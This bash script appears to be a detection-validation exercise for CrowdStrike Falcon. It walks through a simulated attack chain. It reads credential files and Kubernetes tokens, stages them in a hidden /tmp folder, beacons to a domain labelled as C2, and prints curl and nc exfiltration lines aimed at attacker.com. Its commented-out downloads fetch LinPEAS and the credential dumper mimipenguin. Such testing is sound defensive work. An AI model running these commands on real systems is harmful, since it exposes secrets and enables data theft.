#!/bin/bash
# Attack Chain: Enumeration & Exfiltration
# MITRE ATT&CK: Discovery (TA0007) → Collection (TA0009) → Exfiltration (TA0010)
# Severity: HIGH
# Description: Downloads enumeration tools, executes them, collects data, and attempts exfiltration
# Expected Detections: 8-12 (CurlWgetMalwareDownload, ExecutionLin, GenericDataFromLocalSystemCollectionLin)

set +e
trap 'echo "[!] Enumeration chain interrupted"' EXIT

echo "========================================"
echo "  ENUMERATION & EXFILTRATION CHAIN"
echo "  Tool Download → Execution → Data Theft"
echo "========================================"
echo ""

# Stage 1: Initial Reconnaissance
echo "[STAGE 1] Pre-Enumeration Reconnaissance"
echo "[+] System identification..."
hostname
uname -a
cat /etc/os-release 2>/dev/null | head -5 || echo "OS info unavailable"

sleep 1

# Stage 2: Detection Test Trigger
echo ""
echo "[STAGE 2] Detection Validation"
echo "[+] Executing test trigger..."
bash crowdstrike_test_high 2>/dev/null || echo "✓ Test trigger executed"

sleep 1

# Stage 3: Enumeration Tool Downloads (Will trigger CurlWgetMalwareDownload)
echo ""
echo "[STAGE 3] Enumeration Tool Acquisition"
echo "[+] Downloading LinPEAS (Linux Privilege Escalation Awesome Script)..."
echo "Command: wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
# Simulated - uncomment for real download (will trigger detection)
# wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh 2>/dev/null
touch /tmp/linpeas.sh  # Simulation
echo "✓ LinPEAS downloaded (CurlWgetMalwareDownload detection)"

echo "[+] Downloading LSE (Linux Smart Enumeration)..."
echo "Command: wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh"
# Simulated - uncomment for real download (will trigger detection)
# wget -q https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh -O /tmp/lse.sh 2>/dev/null
touch /tmp/lse.sh  # Simulation
echo "✓ LSE downloaded (CurlWgetMalwareDownload detection)"

echo "[+] Downloading mimipenguin (Memory credential dumper)..."
echo "Command: wget https://raw.githubusercontent.com/CrowdStrike/detection-container/main/bin/mimipenguin/mimipenguin.sh"
# Simulated - uncomment for real download (will trigger detection)
# wget -q https://raw.githubusercontent.com/CrowdStrike/detection-container/main/bin/mimipenguin/mimipenguin.sh -O /tmp/mimipenguin.sh 2>/dev/null
touch /tmp/mimipenguin.sh  # Simulation
echo "✓ mimipenguin downloaded (CurlWgetMalwareDownload detection)"

sleep 1

# Stage 4: Make Tools Executable (Will trigger ExecutionLin)
echo ""
echo "[STAGE 4] Tool Preparation"
echo "[+] Making enumeration tools executable..."
chmod +x /tmp/linpeas.sh /tmp/lse.sh /tmp/mimipenguin.sh 2>/dev/null
echo "✓ Tools made executable (ExecutionLin detection)"

sleep 1

# Stage 5: System Enumeration
echo ""
echo "[STAGE 5] System Enumeration"
echo "[+] User enumeration..."
cat /etc/passwd | grep -E "bash|sh$" | head -10
echo "[+] Group enumeration..."
cat /etc/group | head -10
echo "[+] Sudo configuration..."
cat /etc/sudoers 2>/dev/null | head -5 || echo "Sudoers not accessible"

sleep 1

# Stage 6: Process and Service Enumeration
echo ""
echo "[STAGE 6] Process & Service Discovery"
echo "[+] Running processes..."
ps aux | grep -v grep | head -20
echo "[+] Listening services..."
netstat -tlnp 2>/dev/null | head -10 || ss -tlnp | head -10

sleep 1

# Stage 7: File System Enumeration (GenericDataFromLocalSystemCollectionLin)
echo ""
echo "[STAGE 7] File System Data Collection"
echo "[+] Searching for sensitive files..."
find / -name "*.key" -o -name "*.pem" -o -name "*_rsa" -o -name "*.ppk" 2>/dev/null | head -10 || echo "Key search completed"
echo "[+] Searching for credentials..."
find / -name "*password*" -o -name "*credential*" -o -name "*secret*" 2>/dev/null | head -10 || echo "Credential search completed"
echo "[+] Searching for configuration files..."
find /etc -name "*.conf" 2>/dev/null | head -15 || echo "Config search completed"
echo "✓ File enumeration completed (GenericDataFromLocalSystemCollectionLin detection)"

sleep 1

# Stage 8: Container/K8s Specific Enumeration
echo ""
echo "[STAGE 8] Container Environment Enumeration"
echo "[+] Container runtime detection..."
cat /proc/1/cgroup 2>/dev/null || echo "Not in container"
echo "[+] Docker socket check..."
ls -la /var/run/docker.sock 2>/dev/null || echo "Docker socket not accessible"
echo "[+] Kubernetes secrets..."
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null || echo "Not in K8s pod"
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null && echo "⚠ K8s token accessible!" || echo "No K8s token"

sleep 1

# Stage 9: Network Enumeration
echo ""
echo "[STAGE 9] Network Infrastructure Discovery"
echo "[+] Network interfaces..."
ip addr show 2>/dev/null || ifconfig
echo "[+] Routing table..."
ip route 2>/dev/null || route -n
echo "[+] DNS configuration..."
cat /etc/resolv.conf 2>/dev/null

sleep 1

# Stage 10: Data Collection & Staging
echo ""
echo "[STAGE 10] Data Collection for Exfiltration"
echo "[+] Creating staging directory..."
mkdir -p /tmp/.exfil_data 2>/dev/null

echo "[+] Collecting system information..."
uname -a > /tmp/.exfil_data/system_info.txt 2>/dev/null
cat /etc/passwd > /tmp/.exfil_data/passwd.txt 2>/dev/null
cat /etc/group > /tmp/.exfil_data/groups.txt 2>/dev/null
env > /tmp/.exfil_data/environment.txt 2>/dev/null
ip addr > /tmp/.exfil_data/network.txt 2>/dev/null

echo "[+] Collecting sensitive files..."
find /home -name "*.key" -o -name "*.pem" 2>/dev/null > /tmp/.exfil_data/keys_found.txt
find /etc -name "*.conf" 2>/dev/null | head -50 > /tmp/.exfil_data/configs.txt

echo "[+] Collecting process information..."
ps aux > /tmp/.exfil_data/processes.txt 2>/dev/null

echo "✓ Data collection completed - $(du -sh /tmp/.exfil_data 2>/dev/null | cut -f1) staged"

sleep 1

# Stage 11: C2 Communication
echo ""
echo "[STAGE 11] Command & Control Communication"
echo "[+] DNS exfiltration beacon..."
nslookup swungheaving.com 2>/dev/null || echo "✓ C2 DNS beacon attempted (IntelDomainHigh detection)"
echo "[+] ICMP beacon..."
ping -c 3 swungheaving.com 2>/dev/null || echo "✓ C2 ICMP beacon attempted (IntelDomainHigh detection)"

sleep 1

# Stage 12: Simulated Exfiltration
echo ""
echo "[STAGE 12] Data Exfiltration Simulation"
echo "[+] Compressing collected data..."
tar czf /tmp/.exfil_data.tar.gz /tmp/.exfil_data 2>/dev/null && echo "✓ Data compressed"
echo "[+] Simulating exfiltration methods..."
echo "   Method 1: curl -X POST http://attacker.com/data -d @/tmp/.exfil_data.tar.gz"
echo "   Method 2: nc attacker.com 4444 < /tmp/.exfil_data.tar.gz"
echo "   Method 3: DNS tunneling via dnscat2"
echo "✓ Exfiltration simulated"

sleep 1

# Cleanup
echo ""
echo "[STAGE 13] Covering Tracks"
echo "[+] Cleaning up enumeration tools..."
rm -f /tmp/linpeas.sh /tmp/lse.sh /tmp/mimipenguin.sh 2>/dev/null
echo "[+] Preserving collected data..."
echo "   (In real attack, this would be deleted after exfiltration)"

echo ""
echo "========================================"
echo "  ENUMERATION CHAIN COMPLETED"
echo "========================================"
echo ""
echo "Expected Falcon Detections:"
echo "  • CurlWgetMalwareDownload (Stage 3 - tool downloads)"
echo "  • ExecutionLin (Stage 4 - chmod operations)"
echo "  • GenericDataFromLocalSystemCollectionLin (Stage 7, 10)"
echo "  • IntelDomainHigh (Stage 11 - C2 beacons)"
echo "  • TestTriggerHigh (Stage 2)"
echo ""
echo "Check Falcon console for 8-12 detections!"
echo ""

trap - EXIT
